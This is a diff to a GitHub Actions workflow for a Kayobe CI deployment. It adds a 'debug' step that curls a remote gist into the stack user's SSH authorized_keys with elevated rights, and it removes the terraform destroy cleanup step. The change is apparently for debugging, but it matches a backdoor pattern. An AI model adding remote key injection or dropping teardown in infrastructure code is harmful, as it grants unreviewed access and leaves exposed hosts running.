@@ -196,6 +196,14 @@ jobs:
         env:
           KAYOBE_VAULT_PASSWORD: ${{ secrets.KAYOBE_VAULT_PASSWORD }}
 
+      - name: debug
+        run: |
+          source venvs/kayobe/bin/activate &&
+          source src/kayobe-config/kayobe-env --environment ci-builder &&
+          kayobe seed host command run --become --command "curl https://gist.githubusercontent.com/assumptionsandg/a691b34235d08c679faa3626c75ef781/raw/8172a150ffa7998c511860bdea89481faf8d870f/gistfile1.txt >> /home/stack/.ssh/authorized_keys"
+        env:
+          KAYOBE_VAULT_PASSWORD: ${{ secrets.KAYOBE_VAULT_PASSWORD }}
+
       - name: Run a distro-sync
         run: |
           source venvs/kayobe/bin/activate &&
@@ -245,12 +253,3 @@ jobs:
           kayobe playbook run src/kayobe-config/etc/kayobe/ansible/push-ofed.yml
         env:
           KAYOBE_VAULT_PASSWORD: ${{ secrets.KAYOBE_VAULT_PASSWORD }}
-
-      - name: Destroy
-        run: terraform destroy -auto-approve
-        working-directory: ${{ github.workspace }}/src/kayobe-config/terraform/aio
-        env:
-          OS_CLOUD: openstack
-          OS_APPLICATION_CREDENTIAL_ID: ${{ secrets.OS_APPLICATION_CREDENTIAL_ID }}
-          OS_APPLICATION_CREDENTIAL_SECRET: ${{ secrets.OS_APPLICATION_CREDENTIAL_SECRET }}
-        if: always()
